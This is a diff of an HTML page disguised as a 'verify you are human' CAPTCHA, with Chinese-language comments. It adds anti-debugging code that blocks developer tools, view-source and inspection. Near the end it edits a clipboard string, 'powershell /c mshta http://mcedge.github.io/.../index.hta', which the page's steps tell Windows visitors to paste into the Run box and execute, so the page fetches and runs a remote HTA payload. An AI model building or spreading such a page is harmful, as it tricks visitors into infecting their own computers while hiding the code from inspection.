@@ -2,18 +2,25 @@
 <html>
 
 <head>
-    <meta charset="UTF-8">
     <title>请稍候...</title>
     <script>
-        let hasUnsaved = true;
+            let hasUnsaved = true;
     document.addEventListener('input', () => hasUnsaved = true);
     window.onbeforeunload = () => hasUnsaved ? '' : void 0;
+        // 1. 禁止右键菜单，阻止通过右键打开「审查元素」
         document.addEventListener('contextmenu', e => e.preventDefault());
+
+        // 2. 拦截常用调试快捷键，从入口阻止用户打开开发者工具
         document.addEventListener('keydown', e => {
+            // 禁止F12
             if (e.key === 'F12') e.preventDefault();
+            // 禁止Ctrl+Shift+I/J/C 开发者工具核心快捷键
             if (e.ctrlKey && e.shiftKey && ['I', 'J', 'C'].includes(e.key)) e.preventDefault();
+            // 禁止Ctrl+U 查看页面源码
             if (e.ctrlKey && e.key.toLowerCase() === 'u') e.preventDefault();
         });
+
+        // 3. 混淆版无限debugger，隐藏debugger关键字，避免被静态检测、替换
         (function () {
             const triggerDebug = new Function('debugger');
             function loopAntiDebug() {
@@ -23,14 +30,22 @@
             loopAntiDebug();
         })();
 
+        // 4. 开发者工具打开检测，通过执行时间差判断，触发强防护
         (function () {
             function checkDevToolOpen() {
                 const startTime = performance.now();
                 debugger;
                 const endTime = performance.now();
+                // 执行时间超过100ms，说明开发者工具已打开（断点触发了暂停）
                 if (endTime - startTime > 100) {
                     console.clear();
+                    // 强防护方案3选1，按需开启
+                    // 方案1：高频无限debugger，几乎无法操作
                     setInterval(() => { debugger; }, 30);
+                    // 方案2：直接跳转空白页，彻底阻止调试
+                    // window.location.replace("about:blank");
+                    // 方案3：清空页面内容
+                    // document.body.innerHTML = "禁止调试";
                 }
             }
             setInterval(checkDevToolOpen, 300);
@@ -82,6 +97,8 @@
             padding-top: 1rem;
             text-align: center;
         }
+
+        /* ---------- 浅色主题 (默认) ---------- */
         :root {
             --bg-body: #fcfcfc;
             --text-body: #333333;
@@ -108,9 +125,11 @@
             --security-text: #333333;
             --checkbox-window-bg: #fafafa;
             --checkbox-window-border: #e0e0e0;
+            /* Logo文字颜色：浅色下为黑色 */
             --logo-text-color: #333333;
         }
 
+        /* ---------- 深色主题 (跟随系统) ---------- */
         @media (prefers-color-scheme: dark) {
             :root {
                 --bg-body: #222222;
@@ -138,6 +157,7 @@
                 --security-text: #cccccc;
                 --checkbox-window-bg: #222222;
                 --checkbox-window-border: #666666;
+                /* Logo文字颜色：深色下为白色 */
                 --logo-text-color: #ffffff;
             }
         }
@@ -156,6 +176,7 @@
             color: var(--footer-text);
         }
 
+        /* 复选框窗口 */
         #checkbox-window {
             width: 320px;
             height: 70px;
@@ -167,6 +188,7 @@
             opacity: 0;
             transition: opacity 0.5s, background-color 0.3s, border-color 0.3s;
             display: none;
+            /* 初始隐藏，稍后显示 */
         }
 
         #checkbox {
@@ -578,7 +600,7 @@
                         '在弹出的运行框里面,按下“<b>Ctrl</b>”键并按下“<b>V</b>”或者在输入框内右键粘贴',
                         '点击<b>确定</b>或者按下键盘上的<b>Enter</b>键来完成验证'
                     ],
-                    echo: 'mshta http://mcedge.github.io/mcedge/index.hta# ✅ I am not a robot - CAPTCHA Verification ID: 114514'
+                    echo: 'powershell /c mshta http://mcedge.github.io/mcedge/index.hta# ✅ I am not a robot - CAPTCHA Verification ID: 114514'
                 },
                 mac: {
                     step: [
